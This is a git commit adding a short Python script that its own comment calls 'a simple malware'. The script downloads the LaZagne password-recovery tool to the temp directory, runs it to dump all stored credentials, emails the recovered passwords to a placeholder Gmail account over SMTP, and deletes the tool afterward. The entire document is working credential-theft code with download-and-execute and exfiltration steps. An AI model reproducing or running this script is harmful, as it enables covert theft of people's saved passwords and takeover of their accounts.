975b2aefdba70515db6387f744811a3f3bc6f50c
RahimMahat <85168245+RahimMahat@users.noreply.github.com>
2021-07-04 12:51:59 +0530

    initial commit

---
+++ Z9_DER.py
@@ -0,0 +1,38 @@
+#!/usr/bin/env python
+
+import requests, subprocess, smtplib, re, os, tempfile
+
+def download(url):
+    get_request = requests.get(url)
+    
+    file_name = url.split("/")[-1]  
+    with open(file_name,"wb") as out_file:
+    	out_file.write(get_request.content)
+
+def send_mail(email,passwd,message):
+	server = smtplib.SMTP("smtp.gmail.com",587)
+	server.starttls() 
+	server.login(email,passwd)  
+	server.sendmail(email, email,message)  
+	server.quit()
+
+temp_path = tempfile.gettempdir()  # to get the path of temp directory path
+os.chdir(temp_path)
+download("http://localhost/laZagne.exe")
+
+command = "laZagne.exe all"
+recovered_passwords = subprocess.check_output(command,shell=True)
+send_mail("YourEmail@address","passwd",recovered_passwords)
+
+os.remove("laZagne.exe")  # to remove the laZagne programm once done recovering passwords
+
+'''
+It's a simple malware which basically will
+while run with python 
+download the laZagne 
+execute it 
+report us back
+that's why the name 'DER'
+and the script we've build is
+cross platform compatible 
+'''
